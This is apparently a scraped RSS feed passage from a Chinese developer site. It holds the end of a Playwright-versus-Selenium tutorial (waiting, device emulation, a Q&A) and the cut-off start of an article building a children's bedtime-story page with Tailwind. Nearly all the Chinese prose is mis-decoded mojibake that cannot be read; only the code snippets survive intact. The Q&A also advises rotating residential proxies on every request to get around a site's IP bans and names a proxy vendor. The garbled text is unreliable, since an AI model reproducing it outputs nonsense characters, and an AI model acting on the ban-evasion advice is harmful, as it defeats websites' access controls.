<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>å®æµ‹æ˜¾ç¤ºï¼Œ4æ ¸CPUä¸Šå¹¶è¡Œæ‰§è¡Œ10ä¸ªä»»åŠ¡æ¯”ä¸²è¡Œå¿«7å€ã€‚</p>
<h3 data-id="heading-11">2. æ™ºèƒ½ç­‰å¾…ï¼šå‘Šåˆ«ç¡¬ç¼–ç å»¶è¿Ÿ</h3>
<p>Playwrightçš„è‡ªåŠ¨ç­‰å¾…æœºåˆ¶èƒ½æ™ºèƒ½æ£€æµ‹ï¼š</p>
<ul>
<li>DOMåŠ è½½å®Œæˆ</li>
<li>ç½‘ç»œè¯·æ±‚ç»“æŸ</li>
<li>å…ƒç´ å¯è§/å¯äº¤äº’</li>
</ul>
<p>ç‰¹æ®Šåœºæ™¯å¯è‡ªå®šä¹‰ç­‰å¾…æ¡ä»¶ï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># ç­‰å¾…ä»·æ ¼æ˜¾ç¤º</span>
page.wait_for_selector(<span class="hljs-string">".price"</span>, <span class="hljs-keyword">state</span>=<span class="hljs-string">"visible"</span>)

<span class="hljs-comment"># ç­‰å¾…ç‰¹å®šç½‘ç»œè¯·æ±‚å®Œæˆ</span>
page.wait_for_request(<span class="hljs-string">"**/api/price*"</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h3 data-id="heading-12">3. ç§»åŠ¨ç«¯æµ‹è¯•ï¼šä¸€é”®åˆ‡æ¢è®¾å¤‡</h3>
<p>æ¨¡æ‹ŸiPhone 14 Proï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">context</span> = browser.new_context(
    <span class="hljs-attr">viewport</span>={<span class="hljs-string">"width"</span>: <span class="hljs-number">393</span>, <span class="hljs-string">"height"</span>: <span class="hljs-number">852</span>},
    <span class="hljs-attr">user_agent</span>=<span class="hljs-string">"Mozilla/5.0..."</span>
)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>æ›´æ¨èä½¿ç”¨é¢„è®¾è®¾å¤‡é…ç½®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">mobile</span> = browser.new_context(device=<span class="hljs-string">"iPhone 14 Pro"</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-13">å››ã€å¸¸è§é—®é¢˜Q&amp;A</h2>
<p><strong>Q1ï¼šè¢«ç½‘ç«™å°IPæ€ä¹ˆåŠï¼Ÿ</strong><br/>
Aï¼šç«‹å³å¯ç”¨å¤‡ç”¨ä»£ç†æ± ï¼Œå»ºè®®ä½¿ç”¨ä½å®…ä»£ç†ï¼ˆå¦‚ç«™å¤§çˆ·IPä»£ç†ï¼‰ï¼Œé…åˆæ¯è¯·æ±‚æ›´æ¢IPç­–ç•¥ã€‚Playwrightè®¾ç½®ä»£ç†ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">browser</span> = p.chromium.launch(proxy={<span class="hljs-string">"server"</span>: <span class="hljs-string">"http://your-proxy:port"</span>})
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>Q2ï¼šPlaywrightæ”¯æŒå“ªäº›ç¼–ç¨‹è¯­è¨€ï¼Ÿ</strong><br/>
Aï¼šå®˜æ–¹æ”¯æŒPythonã€JavaScript/TypeScriptã€Javaã€.NETï¼Œç¤¾åŒºç»´æŠ¤C#ã€Goç­‰ç»‘å®šã€‚</p>
<p><strong>Q3ï¼šå¦‚ä½•å¤„ç†åŠ¨æ€åŠ è½½çš„å†…å®¹ï¼Ÿ</strong><br/>
Aï¼šä½¿ç”¨<code>wait_for_selector()</code>æˆ–<code>wait_for_function()</code>ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-rust" lang="rust">page.<span class="hljs-title function_ invoke__">wait_for_function</span>(<span class="hljs-symbol">'document</span>.<span class="hljs-title function_ invoke__">querySelectorAll</span>(<span class="hljs-string">".item"</span>).length &gt; <span class="hljs-number">5</span>')
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>Q4ï¼šä¸Seleniumç›¸æ¯”ï¼ŒPlaywrightçš„ç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
Aï¼š1ï¼‰ç”Ÿæ€ä¸å¦‚Seleniumæˆç†Ÿï¼ˆå¦‚ç¼ºå°‘æŸäº›ç¬¬ä¸‰æ–¹æ’ä»¶ï¼‰ 2ï¼‰ä¼ä¸šçº§éƒ¨ç½²æ¡ˆä¾‹è¾ƒå°‘ 3ï¼‰å¯¹æ—§ç‰ˆIEæ”¯æŒæœ‰é™ã€‚</p>
<p><strong>Q5ï¼šå¦‚ä½•è°ƒè¯•Playwrightè„šæœ¬ï¼Ÿ</strong><br/>
Aï¼šå¯ç”¨è°ƒè¯•æ¨¡å¼ä¼šè‡ªåŠ¨æ‰“å¼€æµè§ˆå™¨å¼€å‘è€…å·¥å…·ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">browser</span> = p.chromium.launch(headless=<span class="hljs-literal">False</span>, slow_mo=<span class="hljs-number">500</span>)  <span class="hljs-comment"># æ…¢åŠ¨ä½œ500ms</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-14">ç»“è¯­ï¼šé€‰æ‹©å¯¹çš„å·¥å…·ï¼Œäº‹åŠåŠŸå€</h2>
<p>Playwrightä¸æ˜¯Seleniumçš„ç®€å•æ›¿ä»£å“ï¼Œè€Œæ˜¯ä¸ºç°ä»£Webå¼€å‘é‡æ–°è®¾è®¡çš„å·¥å…·ã€‚å®ƒè§£å†³äº†Seleniumé•¿æœŸå­˜åœ¨çš„æ€§èƒ½ç“¶é¢ˆã€APIå†—ä½™ç­‰é—®é¢˜ï¼Œç‰¹åˆ«é€‚åˆï¼š</p>
<ul>
<li>éœ€è¦é«˜é¢‘æ“ä½œçš„çˆ¬è™«é¡¹ç›®</li>
<li>å¤æ‚äº¤äº’çš„è‡ªåŠ¨åŒ–æµ‹è¯•</li>
<li>å¤šæµè§ˆå™¨/è®¾å¤‡å…¼å®¹æ€§æµ‹è¯•</li>
</ul>
<p>å¯¹äºå·²æœ‰Seleniumé¡¹ç›®ï¼Œå»ºè®®é‡‡ç”¨æ¸è¿›å¼è¿ç§»ç­–ç•¥ï¼šå…ˆåœ¨æ–°æ¨¡å—ä½¿ç”¨Playwrightï¼Œé€æ­¥æ›¿æ¢æ ¸å¿ƒåŠŸèƒ½ã€‚æŠ€æœ¯æ¼”è¿›ä¸åº”æ¨å€’é‡æ¥ï¼Œè€Œæ˜¯æŒç»­ä¼˜åŒ–è¿­ä»£ã€‚æ­£å¦‚ä»ç‡ƒæ²¹è½¦æ¢åˆ°ç”µåŠ¨è½¦â€”â€”ä¿ç•™é©¾é©¶ä¹ æƒ¯ï¼Œäº«å—æ€§èƒ½æå‡ã€‚</p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Trae Soloæ¨¡å¼å®æˆ˜ï¼šæˆ‘ç”¨3å°æ—¶æ’¸äº†ä¸ªå„¿ç«¥ç¡å‰æ•…äº‹ç½‘é¡µ]]></title>    <link>https://juejin.cn/post/7582311711429935147</link>    <guid>https://juejin.cn/post/7582311711429935147</guid>    <pubDate>2025-12-11T08:53:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582311711429935147" data-draft-id="7582393212767207478" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Trae Soloæ¨¡å¼å®æˆ˜ï¼šæˆ‘ç”¨3å°æ—¶æ’¸äº†ä¸ªå„¿ç«¥ç¡å‰æ•…äº‹ç½‘é¡µ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-11T08:53:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è£…ç¡é¹¿å…ˆç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/1117561743761582"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Trae Soloæ¨¡å¼å®æˆ˜ï¼šæˆ‘ç”¨3å°æ—¶æ’¸äº†ä¸ªå„¿ç«¥ç¡å‰æ•…äº‹ç½‘é¡µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1117561743761582/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è£…ç¡é¹¿å…ˆç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T08:53:34.000Z" title="Thu Dec 11 2025 08:53:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œä¸ºTraeä½“éªŒå®˜ï¼Œæœ€è¿‘æ·±åº¦æ²‰æµ¸åœ¨å…¶Soloæ¨¡å¼çš„å¼€å‘ä½“éªŒä¸­â€”â€”è¿™ç§æ— éœ€é…ç½®ç¯å¢ƒã€å¼€ç®±å³ç”¨çš„è½»é‡åŒ–å¼€å‘æ–¹å¼ï¼Œç®€ç›´æ˜¯ç‹¬ç«‹å¼€å‘è€…çš„ç¦éŸ³ã€‚ä¸Šå‘¨å¸®é‚»å±…å®¶å®å¦ˆè§£å†³"å“„ç¡æ•…äº‹è’"çš„é—®é¢˜æ—¶ï¼Œçªå‘å¥‡æƒ³ï¼šä¸å¦‚ç”¨Trae Soloæ¨¡å¼å¿«é€Ÿå¼€å‘ä¸€ä¸ªå„¿ç«¥ç¡å‰æ•…äº‹å±•ç¤ºç½‘é¡µï¼Ÿæ²¡æƒ³åˆ°ä»æ„æ€åˆ°ä¸Šçº¿ä»…ç”¨3å°æ—¶ï¼Œæˆå“è¿˜æ„å¤–æ”¶è·äº†å®å¦ˆä»¬çš„ä¸€è‡´å¥½è¯„ã€‚ä»Šå¤©å°±æŠŠè¿™æ¬¡å®æˆ˜è¿‡ç¨‹åˆ†äº«ç»™å¤§å®¶ï¼Œé€‚åˆå‰ç«¯æ–°æ‰‹å‚è€ƒå­¦ä¹ ã€‚</p>
<p>~~è¿‡ç¨‹çš„è‰°è¾›å°±ä¸è¯´äº†ï¼Œç›´æ¥å¼€å§‹å§ï¼ï¼ï¼ï¼ï¼ï¼
~~</p>
<h2 data-id="heading-0">å¼€å‘èƒŒæ™¯ï¼šä¸ºä»€ä¹ˆè¦åšè¿™ä¸ªç½‘é¡µï¼Ÿ</h2>
<p>é‚»å±…å®¶3å²çš„å°æœ‹å‹æ¯å¤©ç¡å‰éƒ½è¦å¬æ•…äº‹ï¼Œä½†æ‰‹æœºé‡Œçš„æ•…äº‹APPè¦ä¹ˆå¹¿å‘Šå¤ªå¤šï¼Œè¦ä¹ˆæ•…äº‹é•¿åº¦ä¸é€‚åˆç¡å‰åœºæ™¯ï¼ˆæœ‰çš„å¤ªé•¿å­©å­å¬åˆ°ä¸€åŠå°±å›°äº†ï¼Œæœ‰çš„å¤ªçŸ­åˆè¾¾ä¸åˆ°å“„ç¡æ•ˆæœï¼‰ã€‚ä½œä¸ºæŠ€æœ¯äººï¼Œç¬¬ä¸€ååº”å°±æ˜¯"è‡ªå·±åšä¸€ä¸ªæ›´åˆé€‚çš„"ã€‚</p>
<p>æ ¸å¿ƒéœ€æ±‚å¾ˆæ˜ç¡®ï¼š<strong>æ— å¹¿å‘Šã€æ•…äº‹é•¿åº¦æ§åˆ¶åœ¨10-15åˆ†é’Ÿã€è§†è§‰æ¸©é¦¨ã€æ“ä½œç®€å•</strong>ï¼ˆæ¯•ç«Ÿæ˜¯ç»™å®¶é•¿å’Œä½é¾„å„¿ç«¥ç”¨çš„ï¼‰ã€‚ç»“åˆTraeçš„Soloæ¨¡å¼ç‰¹æ€§â€”â€”æ”¯æŒå®æ—¶é¢„è§ˆã€å†…ç½®å¸¸ç”¨å‰ç«¯æ¨¡æ¿ã€è‡ªåŠ¨å¤„ç†ä¾èµ–ç®¡ç†ï¼Œæ­£å¥½åŒ¹é…è¿™ç§å¿«é€Ÿå¼€å‘åœºæ™¯ï¼Œäºæ˜¯ç«‹åˆ»å¼€å·¥ã€‚</p>
<h2 data-id="heading-1">æŠ€æœ¯é€‰å‹ï¼šSoloæ¨¡å¼ä¸‹çš„è½»é‡ç»„åˆ</h2>
<p>Trae Soloæ¨¡å¼æ”¯æŒå¤šç§æŠ€æœ¯æ ˆçš„å¿«é€Ÿåˆå§‹åŒ–ï¼Œè€ƒè™‘åˆ°é¡¹ç›®çš„è½»é‡åŒ–éœ€æ±‚å’Œå¼€å‘æ•ˆç‡ï¼Œæœ€ç»ˆé€‰æ‹©äº†æœ€ç®€æ´çš„ç»„åˆï¼š</p>
<ul>
<li><strong>ç»“æ„å±‚</strong>ï¼šHTML5 è¯­ä¹‰åŒ–æ ‡ç­¾ï¼Œæå‡å¯è¯»æ€§å’ŒSEOå‹å¥½æ€§</li>
<li><strong>æ ·å¼å±‚</strong>ï¼šTailwind CSSï¼ˆTraeå†…ç½®æ¨¡æ¿ç›´æ¥è°ƒç”¨ï¼Œæ— éœ€é¢å¤–é…ç½®ï¼‰ï¼Œå¿«é€Ÿå®ç°æ¸©é¦¨ç«¥è¶£çš„è§†è§‰é£æ ¼</li>
<li><strong>äº¤äº’å±‚</strong>ï¼šåŸç”ŸJavaScriptï¼Œå®ç°æ•…äº‹åˆ‡æ¢ã€å­—ä½“è°ƒæ•´ã€å¤œé—´æ¨¡å¼ç­‰æ ¸å¿ƒäº¤äº’</li>
<li><strong>èµ„æºåº“</strong>ï¼šé€‰ç”¨å¼€æºçš„å„¿ç«¥æ’ç”»APIå’Œæ— ç‰ˆæƒèƒŒæ™¯éŸ³ä¹ï¼Œé¿å…ä¾µæƒé—®é¢˜</li>
</ul>
<p>Trae Soloæ¨¡å¼çš„ä¼˜åŠ¿åœ¨è¿™é‡Œä½“ç°å¾—æ·‹æ¼“å°½è‡´ï¼šé€‰æ‹©"HTML+Tailwind"æ¨¡æ¿åï¼Œè‡ªåŠ¨åŠ è½½åŸºç¡€ä¾èµ–ï¼Œå·¦ä¾§å†™ä»£ç å³ä¾§å®æ—¶é¢„è§ˆï¼Œä¿®æ”¹æ ·å¼æ—¶ç”šè‡³èƒ½é€šè¿‡å†…ç½®çš„Tailwindæç¤ºå¿«é€Ÿè¡¥å…¨ç±»åï¼Œæ¯”æœ¬åœ°é…ç½®ç¯å¢ƒèŠ‚çœäº†è‡³å°‘1å°æ—¶ã€‚</p>
<h2 data-id="heading-2">æ ¸å¿ƒåŠŸèƒ½å®ç°ï¼šä»éœ€æ±‚åˆ°ä»£ç çš„è½åœ°</h2>
<p>å…ˆæ”¾ä¸ªæ ¸å¿ƒåŠŸèƒ½æ¸…å•ï¼Œå†é€ä¸ªæ‹†è§£å®ç°æ€è·¯ï¼ˆå…³é”®ä»£ç å·²é™„ä¸Šï¼Œå¯ç›´æ¥å¤åˆ¶å¤ç”¨ï¼‰ï¼š</p>
<ol>
<li>æ•…äº‹å¡ç‰‡å±•ç¤ºï¼ˆæŒ‰ä¸»é¢˜åˆ†ç±»ï¼šåŠ¨ç‰©æ•…äº‹ã€å¥‡å¹»å†’é™©ã€äº²æƒ…å‹æƒ…ï¼‰</li>
<li>æ•…äº‹è¯¦æƒ…é¡µï¼ˆæ”¯æŒå­—ä½“å¤§å°è°ƒæ•´ã€è¿›åº¦è®°å¿†ï¼‰</li>
<li>å¤œé—´æ¨¡å¼åˆ‡æ¢ï¼ˆä¿æŠ¤å­©å­è§†åŠ›ï¼‰</li>
<li>èƒŒæ™¯éŸ³ä¹å¯æ§æ’­æ”¾ï¼ˆèˆ’ç¼“çš„æ‘‡ç¯®æ›²ï¼Œå¯æš‚åœ/åˆ‡æ¢ï¼‰</li>
</ol>
<h3 data-id="heading-3">1. é¡µé¢å¸ƒå±€ï¼šç”¨Tailwindå¿«é€Ÿæ­å‡ºç«¥è¶£é£æ ¼</h3>
<p>å„¿ç«¥ç½‘é¡µçš„è§†è§‰æ ¸å¿ƒæ˜¯"æŸ”å’Œ+é²œæ˜"ï¼Œé¿å…é«˜é¥±å’Œè‰²åˆºæ¿€å­©å­çœ¼ç›ã€‚ç”¨Tailwindçš„è‡ªå®šä¹‰é¢œè‰²åŠŸèƒ½å®šä¹‰äº†3ä¸ªä¸»è‰²è°ƒï¼šæ·¡ç²‰è‰²ï¼ˆ#FFE6F2ï¼‰ã€è–„è·ç»¿ï¼ˆ#E6FFFAï¼‰ã€é¹…é»„è‰²ï¼ˆ#FFFBE7ï¼‰ï¼Œåˆ†åˆ«å¯¹åº”ä¸åŒä¸»é¢˜çš„æ•…äº‹å¡ç‰‡ã€‚</p>
<p>å…³é”®å¸ƒå±€ä»£ç ï¼ˆæ•…äº‹åˆ—è¡¨é¡µï¼‰ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- é¡¶éƒ¨å¯¼èˆªæ ï¼ˆå¸¦å¤œé—´æ¨¡å¼åˆ‡æ¢ï¼‰ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-white shadow-sm fixed top-0 w-full z-10 transition-colors duration-300"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"navbar"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mx-auto px-4 py-3 flex justify-between items-center"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-2xl font-bold text-pink-500"</span>&gt;</span>æ™šå®‰å°æ•…äº‹<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nightModeBtn"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 rounded-full hover:bg-gray-100"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"h-6 w-6 text-yellow-400"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 24 24"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"currentColor"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">stroke-linecap</span>=<span class="hljs-string">"round"</span> <span class="hljs-attr">stroke-linejoin</span>=<span class="hljs-string">"round"</span> <span class="hljs-attr">stroke-width</span>=<span class="hljs-string">"2"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>

<span class="hljs-comment">&lt;!-- æ•…äº‹åˆ†ç±»æ ‡ç­¾ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mx-auto px-4 pt-20 pb-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex flex-wrap gap-2 mb-6"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"categoryTabs"</span>&gt;</span>
